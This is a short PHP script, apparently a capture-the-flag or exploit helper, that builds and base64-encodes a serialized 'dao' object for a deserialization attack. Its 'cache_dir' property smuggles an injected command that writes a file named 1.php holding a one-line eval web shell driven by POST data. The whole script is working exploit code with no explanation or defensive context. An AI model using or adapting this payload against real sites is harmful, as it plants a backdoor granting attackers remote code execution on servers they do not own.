<?php
class config{
    public $cache_dir = 'cache/*;file_put_contents("1.php","<?php eval($_POST[1]);?>");';
}
class dao
{
    private $config;

    public function __construct()
    {
        $this->config = new config();
    }
}
echo base64_encode(serialize(new dao()));
?>
